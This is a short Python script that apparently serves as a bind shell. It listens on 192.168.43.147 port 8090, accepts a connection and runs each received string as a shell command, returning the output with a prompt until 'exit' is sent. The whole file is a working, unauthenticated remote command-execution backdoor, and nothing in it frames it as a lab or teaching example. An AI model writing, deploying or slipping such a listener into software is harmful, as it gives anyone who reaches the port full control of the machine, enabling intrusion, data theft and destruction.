import socket
import subprocess

HOST = '192.168.43.147'
PORT = 8090

s = socket.socket()
s.bind((HOST, PORT))
s.listen(1)

print(f"Listening on {HOST}:{PORT}...")

conn, addr = s.accept()
print(f"Connected by {addr}")

while True:
    command = conn.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.getoutput(command)
    conn.send(output.encode())
    conn.send('\n'.encode())  # Add a newline after sending the output
    conn.send('>> '.encode())  # Send the input prompt again

print("Closing connection...")
conn.close()
s.close()
